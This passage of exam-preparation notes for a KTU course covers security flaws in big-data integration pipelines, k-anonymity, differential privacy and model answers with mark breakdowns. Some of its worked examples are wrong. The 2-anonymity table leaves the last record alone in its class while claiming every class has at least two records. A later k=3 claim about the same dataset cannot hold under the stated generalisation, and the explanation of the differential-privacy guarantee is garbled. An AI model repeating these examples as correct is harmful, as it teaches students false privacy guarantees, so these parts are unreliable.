| Mass Assignment | Transformation | CO4 | Analyze | Allow-list of fields, OWASP API Top 10 |
| Broken Access Control | Storage | CO3 | Apply | RBAC, ABAC, Apache Ranger |
| Re-identification | Publication | CO4 | Evaluate | k-anonymity, t-closeness, differential privacy |
| Data Poisoning | Transformation | CO4 | Analyze | Statistical outlier detection, provenance tracking |
| Inference Attack | Aggregation | CO4 | Evaluate | Noise injection, query result restriction |
| Log Tampering | Storage | CO3 | Apply | Write-once storage, cryptographic log signing |
| Insecure Deserialization | Ingestion | CO3 | Apply | Strict type validation, sandboxed parsers |
| API Key Leakage | Ingestion | CO3 | Apply | Secrets manager, env-var injection, rotation |

### 3.4 Numerical Worked Example: k-Anonymity on a Sample Dataset

**Original Dataset (D):**

| Age | ZIP | Disease |
|-----|-----|---------|
| 28 | 682001 | Cancer |
| 28 | 682001 | Flu |
| 35 | 682005 | Diabetes |
| 35 | 682005 | Asthma |
| 42 | 682010 | Cancer |

**Apply 2-anonymity (k=2)** — Suppress last record or generalize:

| Age | ZIP | Disease |
|-----|-----|---------|
| 28 | 682*** | Cancer |
| 28 | 682*** | Flu |
| 35 | 682*** | Diabetes |
| 35 | 682*** | Asthma |
| 4* | 682*** | Cancer |

The equivalence classes (Age, ZIP) all contain at least 2 records, satisfying $\vert G_i \vert \geq k = 2$.

## 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

### Part A Questions (3 Marks Each)

#### Question 1: Define the inference attack in the context of data aggregation.
**[KTU University Exam – June 2024 Model]**

**Model Answer:**
An *inference attack* is a privacy violation in which an adversary deduces sensitive information about an individual by correlating non-sensitive attributes (quasi-identifiers) in an aggregated or published dataset with auxiliary public information. The attack does not require direct access to confidential records — it exploits the residual information left in summary statistics. It is a primary security flaw in data integration because the leak emerges only at the point of aggregation, not within any single source.

> **Marks Breakdown (as per KTU valuation key):** Definition (2 marks) + Example (1 mark) = **3 marks**

#### Question 2: List any three security flaws in the data transformation stage of an integration pipeline.
**[KTU University Exam – Dec 2023 Model]**

**Model Answer:**
1. **Schema Mapping Errors:** Mismatched field semantics between sources leading to data corruption.
2. **Data Poisoning:** Adversarial injection of malicious records that skew aggregates and ML models.
3. **Mass Assignment:** Uncontrolled copying of all input fields into output objects, leaking sensitive attributes.

> **Marks Breakdown:** Each flaw with one-line description = **1 mark each**

---

### Part B Questions (14 Marks Each)

> [!WARNING]
> **KTU Examiner's Valuation Pitfall Callout:** Students often *describe* the flaw but fail to *relate it back to a specific pipeline stage* (Ingestion/Transformation/Storage/Aggregation) and *omit a concrete mitigation*. KTU key requires: **Definition (3) + Stage Identification (3) + Real-world Example (4) + Mitigation (4) = 14 marks**. Missing the mitigation section is the #1 cause of losing 4 marks.

---

#### Question A: (14 Marks)
**(a)** Explain in detail the security flaws that arise during the **data aggregation** stage of a big data pipeline. Use the re-identification attack as a detailed case study. **(7 marks)**

**(b)** Discuss the **k-anonymity** and **differential privacy** techniques as countermeasures, with worked numerical examples for each. **(7 marks)**

**Model Solution (a):**

Data aggregation combines data from multiple sources to produce summary statistics, OLAP cubes, or machine-learning features. The security flaws are:

1. **Inference Attacks:** Aggregated data can still leak sensitive information when combined with external auxiliary data. Example: average salary of a department combined with headcount can reveal individual high-earner identity.

2. **Re-identification Attacks:** When quasi-identifiers (e.g., ZIP + DOB + Gender) are not properly generalized, the unique fingerprint of an individual can be reconstructed. Latanya Sweeney's classic 2002 study showed that **87% of Americans** can be uniquely identified using just three quasi-identifiers.

3. **Skewness Attacks:** Even with k-anonymity satisfied, an attacker can infer sensitive values if the distribution of sensitive attributes within an equivalence class is skewed. For example, if all 5 records in a k=5 group have "Cancer," then knowing the group guarantees disclosure.

4. **Differential Disclosure via Repeated Aggregates:** Publishing the same aggregate repeatedly over time (e.g., monthly counts) can be differenced to deduce individual events.

5. **Reconstruction Attacks:** Given enough marginal statistics (e.g., 2-way or 3-way marginals), an attacker can reconstruct the full underlying table — as demonstrated in the US Census reconstruction case (2018).

**Model Solution (b):**

**k-Anonymity (with numerical example):**

For a dataset $D$ with quasi-identifier $Q = \{ZIP, Age\}$, the condition is:

$$\forall \text{ record } r \in D, \vert\{r' \in D : Q(r') = Q(r)\}\vert \geq k$$

Worked example with $k = 3$ on the dataset from Section 3.4 was shown — generalization of ZIP to first 3 digits and Age to 5-year bins ensures every equivalence class has $\vert G_i \vert \geq 3$.

**Limitation:** Vulnerable to skewness and homogeneity attacks.

**Differential Privacy (with worked example):**

For a counting query $f(D) = \sum_{i=1}^{n} x_i$, the Laplace Mechanism adds noise:

$$M(D) = f(D) + \text{Lap}\left(\frac{\Delta f}{\varepsilon}\right)$$

Suppose we query the number of patients with disease X in a hospital. True count = 100. Sensitivity $\Delta f = 1$ (adding/removing one patient changes count by 1). Choose $\varepsilon = 1$.

$$\text{Scale} = \frac{\Delta f}{\varepsilon} = \frac{1}{1} = 1$$

Sample a Laplace noise value: $\text{Lap}(1) = +0.7$ (random sample).

$$M(D) = 100 + 0.7 = 100.7$$

The released count is **100.7**, which preserves privacy because any individual contributes at most $e^{\varepsilon} = e \approx 2.718$ times the probability of being included or excluded.

> **Marks Distribution (as per KTU):** Theory (4) + Numerical (2) + Comparison/Trade-offs (1) = **7 marks**

---

#### Question B: (14 Marks)
**(a)** Describe the **Extract-Transform-Load (ETL)** pipeline and identify **five specific security flaws** that can occur at each stage. **(7 marks)**

**(b)** With a suitable Mermaid-style block diagram, illustrate the **defense-in-depth architecture** for securing a data aggregation pipeline and explain each layer. **(7 marks)**

**Model Solution (a):**

**ETL Pipeline Definition:** ETL is the data integration process where data is **Extracted** from source systems, **Transformed** into the target schema and cleaned, and **Loaded** into a destination warehouse or lake.

**Stage-wise Security Flaws:**

| Stage | Flaw | Consequence |
|-------|------|-------------|
| **Extract** | Insecure Connectors (No TLS) | Man-in-the-middle interception of raw data |
| **Extract** | Credential Leakage in Source Code | API key compromise and full source breach |
| **Transform** | Schema Mapping Errors | Data corruption and semantic misalignment |
| **Transform** | Mass Assignment | Unintended sensitive fields exposed |
| **Transform** | Data Poisoning | Adversarial rows skew aggregates and ML |
| **Load** | Insufficient Encryption at Rest | Data-at-rest exposed on disk compromise |
| **Load** | Broken Access Control on Warehouse | Unauthorized aggregations and queries |
| **Load** | Insecure Deserialization | RCE via crafted Parquet/Avro payloads |

**Model Solution (b):**

The defense-in-depth architecture consists of **seven layers** (as visualized in Section 4.4 of this note):

1. **Layer 1 – Transport Security (mTLS):** Encrypts all data in motion between sources, transformation engine, and storage.
2. **Layer 2 – Authentication (OAuth 2.0 / Kerberos):** Ensures only verified identities access the pipeline.
3. **Layer 3 – Authorization (RBAC + ABAC):** Fine-grained access control on aggregated views.
4. **Layer 4 – Schema Validation and Provenance:** Validates structure and tracks origin of every record.
5. **Layer 5 – Aggregation Privacy (k-anonymity / Differential Privacy):** Mathematical guarantees on output privacy.
6. **Layer 6 – Audit Logging (SIEM Integration):** Tamper-evident logs of all access and transformation events.
7. **Layer 7 – Monitoring and Anomaly Detection (ML-based):** Detects unusual query patterns and data drift.

> **Marks Distribution (as per KTU):** Diagram (3) + Layer Explanations (4) = **7 marks**

> **High-Density Revision Checklist for KTU 2024 ESE:**

- ☐ Data aggregation ≠ data integration — the former is about *summarization*; the latter is about *unification*.
- ☐ The **inference attack** is the most subtle and high-mark-yield topic in this module.
- ☐ **k-anonymity** condition: $\vert G_i \vert \geq k$ — memorize the formula and the limitation (skewness).
- ☐ **Differential privacy** uses the **Laplace mechanism**: $M(D) = f(D) + \text{Lap}(\Delta f / \varepsilon)$.
- ☐ The **Expanded Attack Surface Theorem** justifies why integration increases risk.
- ☐ The classic **Sweeney (2002)** re-identification example with **87% uniqueness** is a KTU favorite.
- ☐ Always identify the **pipeline stage** (Ingestion / Transformation / Storage / Aggregation) when discussing a flaw.
- ☐ **Defense-in-Depth** is a 7-layer model — name at least 4 layers to score full marks.
- ☐ Differential privacy composition: $\varepsilon_{total} = \sum \varepsilon_i$ — privacy budget depletes with more queries.
- ☐ The **OWASP API Security Top 10** flags *Mass Assignment* and *Broken Object Level Authorization* — both relevant here.
- ☐ Quasi-identifiers (QID) are *not* sensitive by themselves but become so when combined — this is the **linkage attack** core.
- ☐ In numerical questions, always show the **substitution step explicitly**; KTU examiners award 1 mark for each step.
- ☐ Common mitigation tools: **Apache Ranger, Apache Atlas, Kylo, Great Expectations, Privacera**.
